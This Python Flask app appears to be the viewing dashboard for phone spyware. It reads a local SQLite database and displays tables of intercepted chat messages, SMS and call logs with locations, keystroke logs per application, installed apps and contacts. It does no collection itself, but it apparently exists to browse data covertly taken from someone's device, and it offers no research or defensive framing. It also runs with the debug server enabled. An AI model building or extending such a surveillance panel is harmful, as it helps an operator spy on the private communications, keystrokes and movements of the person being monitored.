from flask import Flask, render_template_string
import sqlite3

app = Flask(__name__)

# Database connection function
def get_db_connection():
		conn = sqlite3.connect('data.db')
		conn.row_factory = sqlite3.Row
		return conn

# --- Routes for displaying data ---

@app.route('/')
def index():
		return render_template_string("""
				<h1>Main Menu</h1>
				<ul>
						<li><a href="/chats">Chats</a></li>
						<li><a href="/sms">SMS</a></li>
						<li><a href="/calls">Calls</a></li>
						<li><a href="/keylogs">Keylogs</a></li>
						<li><a href="/installed_apps">Installed Apps</a></li>
						<li><a href="/contacts">Contacts</a></li>
				</ul>
		""")

@app.route('/chats')
def chats():
		conn = get_db_connection()
		chats = conn.execute('SELECT * FROM ChatMessages').fetchall()
		conn.close()
		return render_template_string("""
				<h1>Chat Messages</h1>
				<table>
						<thead>
								<tr>
										<th>ID</th>
										<th>Messenger</th>
										<th>Time</th>
										<th>Sender</th>
										<th>Text</th>
								</tr>
						</thead>
						<tbody>
								{% for chat in chats %}
								<tr>
										<td>{{ chat['message_id'] }}</td>
										<td>{{ chat['messenger'] }}</td>
										<td>{{ chat['time'] }}</td>
										<td>{{ chat['sender'] }}</td>
										<td>{{ chat['text'] }}</td>
								</tr>
								{% endfor %}
						</tbody>
				</table>
		""", chats=chats)

@app.route('/sms')
def sms():
		conn = get_db_connection()
		sms_messages = conn.execute('SELECT * FROM SMS').fetchall()
		conn.close()
		return render_template_string("""
				<h1>SMS Messages</h1>
				<table>
						<thead>
								<tr>
										<th>ID</th>
										<th>Type</th>
										<th>Time</th>
										<th>From/To</th>
										<th>Text</th>
										<th>Location</th>
								</tr>
						</thead>
						<tbody>
								{% for sms in sms_messages %}
								<tr>
										<td>{{ sms['sms_id'] }}</td>
										<td>{{ sms['sms_type'] }}</td>
										<td>{{ sms['time'] }}</td>
										<td>{{ sms['from_to'] }}</td>
										<td>{{ sms['text'] }}</td>
										<td>{{ sms['location'] }}</td>
								</tr>
								{% endfor %}
						</tbody>
				</table>
		""", sms_messages=sms_messages)

@app.route('/calls')
def calls():
		conn = get_db_connection()
		call_logs = conn.execute('SELECT * FROM Calls').fetchall()
		conn.close()
		return render_template_string("""
				<h1>Call Logs</h1>
				<table>
						<thead>
								<tr>
										<th>ID</th>
										<th>Type</th>
										<th>Time</th>
										<th>From/To</th>
										<th>Duration</th>
										<th>Location</th>
								</tr>
						</thead>
						<tbody>
								{% for call in call_logs %}
								<tr>
										<td>{{ call['call_id'] }}</td>
										<td>{{ call['call_type'] }}</td>
										<td>{{ call['time'] }}</td>
										<td>{{ call['from_to'] }}</td>
										<td>{{ call['duration'] }}</td>
										<td>{{ call['location'] }}</td>
								</tr>
								{% endfor %}
						</tbody>
				</table>
		""", call_logs=call_logs)

@app.route('/keylogs')
def keylogs():
		conn = get_db_connection()
		keylogs = conn.execute('SELECT * FROM Keylogs').fetchall()
		conn.close()
		return render_template_string("""
				<h1>Keylogs</h1>
				<table>
						<thead>
								<tr>
										<th>ID</th>
										<th>Application</th>
										<th>Time</th>
										<th>Text</th>
								</tr>
						</thead>
						<tbody>
								{% for keylog in keylogs %}
								<tr>
										<td>{{ keylog['keylog_id'] }}</td>
										<td>{{ keylog['application'] }}</td>
										<td>{{ keylog['time'] }}</td>
										<td>{{ keylog['text'] }}</td>
								</tr>
								{% endfor %}
						</tbody>
				</table>
		""", keylogs=keylogs)

@app.route('/installed_apps')
def installed_apps():
		conn = get_db_connection()
		apps = conn.execute('SELECT * FROM InstalledApps').fetchall()
		conn.close()
		return render_template_string("""
				<h1>Installed Apps</h1>
				<table>
						<thead>
								<tr>
										<th>ID</th>
										<th>Application Name</th>
										<th>Package Name</th>
										<th>Install Date</th>
								</tr>
						</thead>
						<tbody>
								{% for app in apps %}
								<tr>
										<td>{{ app['app_id'] }}</td>
										<td>{{ app['application_name'] }}</td>
										<td>{{ app['package_name'] }}</td>
										<td>{{ app['install_date'] }}</td>
								</tr>
								{% endfor %}
						</tbody>
				</table>
		""", apps=apps)

@app.route('/contacts')
def contacts():
		conn = get_db_connection()
		contacts = conn.execute('SELECT * FROM Contacts').fetchall()
		conn.close()
		return render_template_string("""
				<h1>Contacts</h1>
				<table>
						<thead>
								<tr>
										<th>ID</th>
										<th>Name</th>
										<th>Phone Number</th>
										<th>Email</th>
										<th>Last Contacted</th>
								</tr>
						</thead>
						<tbody>
								{% for contact in contacts %}
								<tr>
										<td>{{ contact['contact_id'] }}</td>
										<td>{{ contact['name'] }}</td>
										<td>{{ contact['phone_number'] }}</td>
										<td>{{ contact['email'] }}</td>
										<td>{{ contact['last_contacted'] }}</td>
								</tr>
								{% endfor %}
						</tbody>
				</table>
		""", contacts=contacts)
if __name__ == '__main__':
		app.run(debug=True)